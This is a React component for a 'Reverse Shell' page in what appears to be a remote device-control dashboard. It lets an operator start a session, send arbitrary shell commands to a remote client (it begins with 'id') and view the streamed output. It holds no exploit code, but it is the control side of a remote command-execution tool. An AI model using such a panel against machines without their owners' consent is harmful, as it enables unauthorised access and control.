import { useState, useCallback, useRef, useEffect } from 'react';
import { useOutletContext } from 'react-router-dom';
import { CMD } from '@/types';
import { DevicePageHeader } from '@/components/device/shared';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Terminal, Play, Square, Trash2 } from 'lucide-react';
import {
  subscribeToShell,
  onShellOutput,
  onShellStatus,
  type ShellOutputPayload,
  type ShellStatusPayload,
} from '@/services/socket';
import { clientsApi } from '@/services/api';
import type { DeviceOutletContext } from '@/types';

export default function ShellPage() {
  const { clientId, online } = useOutletContext<DeviceOutletContext>();
  const [sessionId] = useState(() => `shell_${Date.now()}`);
  const [running, setRunning] = useState(false);
  const [output, setOutput] = useState<string[]>([]);
  const [command, setCommand] = useState('');
  const [history, setHistory] = useState<string[]>([]);
  const [historyIdx, setHistoryIdx] = useState(-1);
  const [sending, setSending] = useState(false);
  const outputRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);
  const unsubscribeRef = useRef<(() => void) | null>(null);

  // Subscribe to shell output
  useEffect(() => {
    const unsubOutput = onShellOutput((data: ShellOutputPayload) => {
      if (data.id !== clientId) return;
      if (data.output) {
        setOutput(prev => [...prev, data.output]);
      }
      if (data.exitCode !== null && data.exitCode !== undefined) {
        setOutput(prev => [...prev, `\n[Process exited with code ${data.exitCode}]`]);
      }
    });

    const unsubStatus = onShellStatus((data: ShellStatusPayload) => {
      if (data.id !== clientId) return;
      if (data.enabled !== undefined) {
        setRunning(data.enabled);
      }
    });

    return () => {
      unsubOutput();
      unsubStatus();
    };
  }, [clientId]);

  // Subscribe to shell room when running
  useEffect(() => {
    if (running) {
      unsubscribeRef.current = subscribeToShell(clientId);
    }
    return () => {
      if (unsubscribeRef.current) {
        unsubscribeRef.current();
        unsubscribeRef.current = null;
      }
    };
  }, [running, clientId]);

  // Auto-scroll to bottom
  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }
  }, [output]);

  const startShell = useCallback(async () => {
    setSending(true);
    try {
      await clientsApi.sendCommand(clientId, CMD.SHELL as any, {
        action: 'start',
        sessionId,
      });
      // Send initial command to bootstrap the shell process
      await clientsApi.sendCommand(clientId, CMD.SHELL as any, {
        action: 'exec',
        sessionId,
        command: 'id',
      });
      setRunning(true);
      setOutput(['$ id']);
    } catch (err: any) {
      setOutput(prev => [...prev, `Error: ${err?.message || 'Failed to start shell'}`]);
    } finally {
      setSending(false);
    }
  }, [clientId, sessionId]);

  const stopShell = useCallback(async () => {
    try {
      await clientsApi.sendCommand(clientId, CMD.SHELL as any, {
        action: 'close',
        sessionId,
      });
    } catch (e) { /* ignore */ }
    try {
      await clientsApi.sendCommand(clientId, CMD.SHELL as any, {
        action: 'stop',
        sessionId,
      });
    } catch (e) { /* ignore */ }
    setRunning(false);
    setOutput(prev => [...prev, '\n--- Shell session ended ---']);
  }, [clientId, sessionId]);

  const sendCommand = useCallback(async () => {
    if (!command.trim()) return;
    const cmd = command.trim();
    setHistory(prev => [...prev, cmd]);
    setHistoryIdx(-1);
    setCommand('');
    setOutput(prev => [...prev, `$ ${cmd}`]);

    try {
      await clientsApi.sendCommand(clientId, CMD.SHELL as any, {
        action: 'exec',
        sessionId,
        command: cmd,
      });
    } catch (err: any) {
      setOutput(prev => [...prev, `Error: ${err?.message || 'Failed to send command'}`]);
    }
  }, [clientId, sessionId, command]);

  const handleKeyDown = useCallback((e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      sendCommand();
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (history.length > 0) {
        const newIdx = historyIdx === -1 ? history.length - 1 : Math.max(0, historyIdx - 1);
        setHistoryIdx(newIdx);
        setCommand(history[newIdx] || '');
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIdx >= 0) {
        const newIdx = historyIdx + 1;
        if (newIdx >= history.length) {
          setHistoryIdx(-1);
          setCommand('');
        } else {
          setHistoryIdx(newIdx);
          setCommand(history[newIdx] || '');
        }
      }
    }
  }, [sendCommand, history, historyIdx]);

  const clearOutput = useCallback(() => {
    setOutput([]);
  }, []);

  return (
    <div className="space-y-4">
      <DevicePageHeader
        title="Reverse Shell"
        subtitle={running ? 'Session active' : 'Start a shell session'}
        actions={[
          running
            ? { label: 'Stop Shell', icon: Square, onClick: stopShell, disabled: sending }
            : { label: 'Start Shell', icon: Play, onClick: startShell, disabled: sending || !online },
        ]}
        badge={{
          label: running ? 'Running' : 'Stopped',
          variant: running ? 'default' : 'secondary',
          className: 'text-[10px]',
        }}
        loading={sending}
      />

      {!running && output.length === 0 && (
        <Card>
          <CardContent className="flex flex-col items-center justify-center py-12 text-center">
            <Terminal className="w-12 h-12 text-muted-foreground mb-4" />
            <h3 className="text-lg font-medium">Reverse Shell</h3>
            <p className="text-sm text-muted-foreground mt-1 max-w-md">
              Execute shell commands directly on the device. Click "Start Shell" to begin an interactive session.
            </p>
            <Button onClick={startShell} disabled={!online || sending} className="mt-4">
              <Play className="w-4 h-4 mr-2" />
              Start Shell
            </Button>
          </CardContent>
        </Card>
      )}

      {(running || output.length > 0) && (
        <Card className="overflow-hidden">
          {/* Terminal output */}
          <div
            ref={outputRef}
            className="bg-black text-green-400 font-mono text-xs p-4 h-96 overflow-y-auto whitespace-pre-wrap break-all"
            onClick={() => inputRef.current?.focus()}
          >
            {output.map((line, i) => (
              <div key={i}>{line}</div>
            ))}
            {running && <span className="animate-pulse">▊</span>}
          </div>

          {/* Command input */}
          <div className="flex items-center gap-2 p-3 border-t bg-muted/30">
            <span className="text-green-600 font-mono text-sm font-bold">$</span>
            <Input
              ref={inputRef}
              value={command}
              onChange={(e) => setCommand(e.target.value)}
              onKeyDown={handleKeyDown}
              placeholder="Type command and press Enter..."
              disabled={!running}
              className="flex-1 font-mono text-sm border-0 bg-transparent focus-visible:ring-0 focus-visible:ring-offset-0 shadow-none"
              autoFocus
            />
            <Button size="sm" variant="ghost" onClick={clearOutput} disabled={output.length === 0}>
              <Trash2 className="w-4 h-4" />
            </Button>
          </div>
        </Card>
      )}
    </div>
  );
}
